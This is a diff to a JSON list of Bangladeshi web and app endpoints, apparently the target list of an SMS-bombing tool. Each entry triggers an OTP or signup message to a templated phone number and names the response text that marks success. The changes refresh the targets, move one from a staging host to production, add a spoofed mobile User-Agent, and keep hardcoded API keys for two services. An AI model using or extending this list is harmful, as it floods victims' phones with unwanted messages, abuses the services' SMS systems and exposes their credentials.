@@ -13,7 +13,7 @@
     "headers": {
         "Content-Type": "application/json"
     },
-    "identifier": "\"success\": \"1\""
+    "identifier": "\"success\":\"1\""
 }, {
     "url": "https://www.poshorabd.com/send-otp-for-new-user?phone_num=0{MOBILE_NO}",
     "method": "get",
@@ -27,7 +27,7 @@
     "headers": {
         "Content-Type": "application/json"
     },
-    "identifier": "\"status\": \"success\""
+    "identifier": "\"status\":\"success\""
 }, {
     "url": "https://api.fashionfield.com.bd/api/customer/login",
     "method": "post",
@@ -35,11 +35,11 @@
     "headers": {
         "Content-Type": "application/json"
     },
-    "identifier": "\"message\": \"success\""
+    "identifier": "\"message\":\"success\""
 }, {
     "url": "https://shijang.com/c-sign-up",
     "method": "post",
-    "data": "c_name=rfgwrhg&c_contact_number=0{MOBILE_NO}",
+    "data": "c_name=Hshsbdb&c_contact_number=0{MOBILE_NO}&c_account_type=Personal&c_business_name=",
     "headers": {
         "Content-Type": "application/x-www-form-urlencoded"
     },
@@ -53,14 +53,6 @@
     },
     "identifier": "Please verify"
 }, {
-    "url": "https://api.bdtickets.com:20100/v1/auth",
-    "method": "post",
-    "data": "{\"phoneNumber\":\"+880{MOBILE_NO}\",\"applicationChannel\":\"WEB_APP\"}",
-    "headers": {
-        "Content-Type": "application/json"
-    },
-    "identifier": "OTP_GENERATED"
-}, {
     "url": "https://prod-api.viewlift.com/identity/signup?site=hoichoitv",
     "method": "post",
     "data": "{\"requestType\":\"send\",\"phoneNumber\":\"+880{MOBILE_NO}\"}",
@@ -68,7 +60,7 @@
         "Content-Type": "application/json",
         "x-api-key": "PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef"
     },
-    "identifier": "\"sent\": \"true\""
+    "identifier": "\"sent\":\"true\""
 }, {
     "url": "https://api.miah.shop/api/otp",
     "method": "post",
@@ -76,9 +68,9 @@
     "headers": {
         "Content-Type": "application/json"
     },
-    "identifier": "\"status\": true"
+    "identifier": "\"status\":true"
 }, {
-    "url": "https://stage.bioscopelive.com/en/login/send-otp?phone=880{MOBILE_NO}&operator=bd-otp",
+    "url": "https://www.bioscopelive.com/en/login/send-otp?phone=880{MOBILE_NO}&operator=bd-otp",
     "method": "get",
     "data": "",
     "headers": {},
@@ -98,7 +90,7 @@
     "headers": {
         "Content-Type": "application/json"
     },
-    "identifier": "status_code:200"
+    "identifier": ""
 }, {
     "url": "https://web-api.binge.buzz/api/v3/otp/send/login",
     "method": "post",
@@ -158,7 +150,7 @@
     "method": "post",
     "data": "{\"mobile_number\":\"0{MOBILE_NO}\"}",
     "headers": {"Content-Type":"application/json", "x-authorization":"QoFN68MGTcosJxSmDf5GCgxXlNcgE1mUH9MUWuDHgs7dugjR7P2ziASzpo3frHL3"},
-    "identifier": "\"success\": true"
+    "identifier": "\"success\":true"
 }, {
     "url": "https://api.eat-z.com/auth/customer/signin",
     "method": "post",
@@ -218,7 +210,7 @@
     "url": "https://edge.ali2bd.com/api/consumer/v1/auth/login",
     "method": "post",
     "data": "{\"username\":\"+880{MOBILE_NO}\"}",
-    "headers": {"Content-Type":"application/json"},
+    "headers": {"Content-Type":"application/json", "User-Agent":"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1811) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.48 Mobile Safari/537.36"},
     "identifier": "success"
 }, {
     "url": "https://api.meenaclick.com/api/front/sms/send/pin",
